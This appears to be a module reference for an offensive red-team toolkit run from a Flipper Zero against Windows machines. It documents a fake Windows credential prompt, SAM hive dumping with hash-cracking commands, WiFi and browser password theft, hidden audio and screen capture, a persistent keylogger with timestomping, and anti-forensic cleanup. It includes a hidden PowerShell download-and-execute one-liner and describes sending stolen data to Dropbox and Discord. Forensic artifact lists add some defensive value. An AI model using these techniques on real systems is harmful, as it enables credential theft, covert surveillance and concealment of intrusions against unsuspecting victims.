# 📚 MODULE REFERENCE
## AUSTRALIS Red Team Arsenal - Complete Module Documentation

---

## 📋 Module Index

| Category | Module | MITRE ID | Description |
|:---------|:-------|:---------|:------------|
| **Credential Access** | [Credential_Phishing](#credential_phishing) | T1056.002 | GUI credential harvesting |
| **Credential Access** | [Credential_OS_Dump](#credential_os_dump) | T1003.002 | SAM/SYSTEM dump |
| **Discovery** | [Discovery_WiFi_Exfiltration](#discovery_wifi_exfiltration) | T1016 | WiFi profile extraction |
| **Discovery** | [Discovery_WiFi_Demo](#discovery_wifi_demo) | T1016 | WiFi demo variant |
| **Discovery** | [Discovery_System_Recon](#discovery_system_recon) | T1082 | System enumeration |
| **Collection** | [Collection_BrowserForensics](#collection_browserforensics) | T1005 | Browser data extraction |
| **Collection** | [Collection_Audio_Surveillance](#collection_audio_surveillance) | T1123 | Audio recording |
| **Collection** | [Collection_Screenshot_Demo](#collection_screenshot_demo) | T1113 | Screen capture (visible) |
| **Collection** | [Collection_Screenshot_Stealth](#collection_screenshot_stealth) | T1113 | Screen capture (stealth) |
| **Persistence** | [Persistence_Keylogger](#persistence_keylogger) | T1056.001 | Keylogger with persistence |
| **Defense Evasion** | [Defense_Evasion_Cleanup](#defense_evasion_cleanup) | T1070 | Anti-forensic cleanup |

---

## 🔑 Credential Access Modules

### Credential_Phishing

**MITRE ATT&CK**: [T1056.002 - Input Capture: GUI Input Capture](https://attack.mitre.org/techniques/T1056/002/)

**Description**: Displays fake Windows Security credential prompt to harvest user credentials.

**Files**:
- `Invoke-CredentialPhish.ps1` - Main PowerShell script
- `DuckyScript_Phish.txt` - Flipper Zero payload
- `README.md` - Module documentation

**Usage**:
```powershell
# Manual execution
powershell -ep bypass -w h -c "irm https://url/to/script.ps1 | iex"

# With Flipper Zero
# Load DuckyScript_Phish.txt → Execute
```

**Behavior**:
1. Waits for mouse movement (anti-sandbox)
2. Disables Caps Lock
3. Shows credential prompt (CredentialUI)
4. Captures username and password
5. Exfiltrates to Dropbox & Discord
6. Cleans traces (PowerShell history, temp files)

**Forensic Artifacts**:
- Event ID 4104 (Script Block Logging)
- Alternate Data Streams in `%TEMP%`
- Network connections to Dropbox/Discord APIs

---

### Credential_OS_Dump

**MITRE ATT&CK**: [T1003.002 - OS Credential Dumping: Security Account Manager](https://attack.mitre.org/techniques/T1003/002/)

**Description**: Extracts SAM and SYSTEM registry hives for offline password cracking.

**Files**:
- `Invoke-SAMDump.ps1` - Extraction script
- `DuckyScript_SAMDump.txt` - Flipper payload
- `README.md` - Module documentation

**Usage**:
```powershell
# Requires Administrator privileges
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

**Post-Exploitation**:
```bash
# Extract hashes with secretsdump (Impacket)
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Crack with Hashcat
hashcat -m 1000 hashes.txt rockyou.txt
```

**Forensic Artifacts**:
- Registry hive backups in temp folders
- Event ID 4656/4663 (Registry access auditing)

---

## 🔍 Discovery Modules

### Discovery_WiFi_Exfiltration

**MITRE ATT&CK**: [T1016 - System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/)

**Description**: Exports all saved WiFi profiles with passwords and exfiltrates via Dropbox.

**Files**:
- `Export-WiFiProfiles.ps1`
- `DuckyScript_WiFi.txt`
- `README.md`

**Usage**:
```powershell
# Manual execution
powershell -ep bypass .\Export-WiFiProfiles.ps1
```

**Behavior**:
1. Creates timestamped folder in Documents
2. Runs `netsh wlan export profile key=clear`
3. Compresses WiFi XMLs to ZIP
4. Uploads to Dropbox
5. Deletes local evidence

**Output Example**:
```xml
<WLANProfile>
  <name>HomeWiFi</name>
  <keyMaterial>PlainTextPassword123</keyMaterial>
</WLANProfile>
```

**Forensic Artifacts**:
- Event ID 4104 with `netsh wlan export`
- Prefetch for `NETSH.EXE`
- ZIP file in Documents (if not cleaned)

---

### Discovery_System_Recon

**MITRE ATT&CK**: [T1082 - System Information Discovery](https://attack.mitre.org/techniques/T1082/)

**Description**: Comprehensive system enumeration (26KB+ script) collecting all system data.

**Files**:
- `Invoke-SystemRecon.ps1`
- `DuckyScript_Recon.txt`
- `README.md`

**Data Collected**:
- Operating System (version, architecture, build)
- Hardware (CPU, RAM, GPU, motherboard)
- Network (IP, MAC, DNS, routes, ARP table)
- Installed software
- Running processes
- User accounts
- Shares and drives
- Environment variables

**Behavior**:
1. Creates 100+ temp files for each category
2. Aggregates to single report
3. Compresses to ZIP
4. Uploads to Dropbox
5. Triggers massive USN Journal activity (detection indicator)

**Forensic Artifacts**:
- USN Journal flood (1000+ events/second)
- Event ID 4104 with large base64 payload
- WMI query events (5857-5861)

---

## 📦 Collection Modules

### Collection_BrowserForensics

**MITRE ATT&CK**: [T1005 - Data from Local System](https://attack.mitre.org/techniques/T1005/)

**Description**: Extracts browsing history, cookies, and saved passwords from Chrome, Edge, Firefox, Opera.

**Files**:
- `Get-BrowserArtifacts.ps1`
- `DuckyScript_Browser.txt`
- `README.md`

**Usage**:
```powershell
# Extract Chrome history
Get-BrowserData -Browser "chrome" -DataType "history"

# Extract Edge bookmarks
Get-BrowserData -Browser "edge" -DataType "bookmarks"
```

**Targeted Files**:
```
Chrome:
  %LOCALAPPDATA%\Google\Chrome\User Data\Default\History
  %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
  %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

Edge:
  %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History
```

**Forensic Artifacts**:
- ShellBag entries for browser profile folders
- LNK files in Recent Items
- Event ID 4663 (if file auditing enabled)

---

### Collection_Audio_Surveillance

**MITRE ATT&CK**: [T1123 - Audio Capture](https://attack.mitre.org/techniques/T1123/)

**Description**: Records ambient audio from system microphone.

**Files**:
- `Invoke-AudioLogger.ps1`
- `DuckyScript_Audio.txt`
- `readme.md`

**Usage**:
```powershell
# Record for 60 seconds
Invoke-AudioLogger -Duration 60 -OutputPath "C:\Temp\audio.wav"
```

**Behavior**:
1. Accesses default recording device
2. Records in WAV format
3. Uploads to Dropbox
4. Deletes local file

**Forensic Artifacts**:
- Audio device driver logs
- Large network upload (audio file size)

---

### Collection_Screenshot_Stealth

**MITRE ATT&CK**: [T1113 - Screen Capture](https://attack.mitre.org/techniques/T1113/)

**Description**: Captures screenshots silently without user notification.

**Files**:
- `Invoke-StealthScreenshot.ps1`
- `DuckyScript_Screenshot_Stealth.txt`

**Usage**:
```powershell
# Capture all screens
Invoke-StealthScreenshot -Interval 5 -Count 10
```

**Behavior**:
1. Uses System.Drawing.Bitmap
2. Captures every X seconds
3. Saves as PNG/JPG
4. Uploads to Dropbox
5. No visual indicators

**Forensic Artifacts**:
- Image files in temp folders
- Event ID 4104 with `System.Drawing` references

---

## ⏱️ Persistence Modules

### Persistence_Keylogger

**MITRE ATT&CK**: [T1056.001 - Input Capture: Keylogging](https://attack.mitre.org/techniques/T1056/001/)

**Description**: Persistent keylogger with timestomping and remote kill switch.

**Files**:
- `Install-PersistenceLogger.ps1`
- `DuckyScript_Keylogger.txt`
- `README.md`

**Behavior**:
1. Hooks keyboard with Win32 API
2. Captures all keystrokes (ASCII + special keys)
3. Buffers to memory
4. Uploads to Dropbox every 5 minutes
5. **Persistence**: Registry Run key or Scheduled Task
6. **Timestomping**: Matches timestamp to `kernel32.dll`
7. **Kill Switch**: Checks for `%TEMP%\stop.txt`

**Special Keys Captured**:
```
[BKSP] - Backspace
[ENT]  - Enter
[ESC]  - Escape
[TAB]  - Tab
[SHIFT], [CTRL], [ALT] - Modifiers
```

**Termination**:
```powershell
New-Item -Path "$env:TEMP\stop.txt" -ItemType File
```

**Forensic Artifacts**:
- USN Journal vs $MFT timestamp mismatch
- Persistence registry keys
- Dropbox uploads with keystroke logs

---

## 🛡️ Defense Evasion Modules

### Defense_Evasion_Cleanup

**MITRE ATT&CK**: [T1070 - Indicator Removal on Host](https://attack.mitre.org/techniques/T1070/)

**Description**: Anti-forensic cleanup to remove evidence of compromise.

**Files**:
- `Invoke-ForensicCleanup.ps1`

**Actions**:
1. **Clear PowerShell History**
   ```powershell
   Remove-Item (Get-PSReadlineOption).HistorySavePath
   Clear-History
   ```

2. **Clear Run Dialog MRU**
   ```powershell
   Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name *
   ```

3. **Delete Temp Files**
   ```powershell
   Remove-Item $env:TEMP\* -Recurse -Force
   ```

4. **Empty Recycle Bin**
   ```powershell
   Clear-RecycleBin -Force
   ```

**Forensic Indicators**:
- **Absence of expected artifacts** (deleted history = suspicious)
- USN Journal shows mass deletions
- Cleared registry keys (compare with baseline)

---

## 🔧 Configuration

### Global Variables (All Modules)

```powershell
# Dropbox Token
$env:DROPBOX_TOKEN = "sl.your_token_here"

# Discord Webhook
$env:DISCORD_WEBHOOK = "https://discord.com/api/webhooks/..."
```

### Module-Specific Configuration

See individual module `README.md` files for specific configuration options.

---

## 📞 Support

For module-specific questions:
1. Check module's `README.md`
2. Review [DEPLOYMENT.md](DEPLOYMENT.md) for setup
3. See [FORENSICS_GUIDE.md](FORENSICS_GUIDE.md) for artifacts

---

**Module Reference Complete** 📖
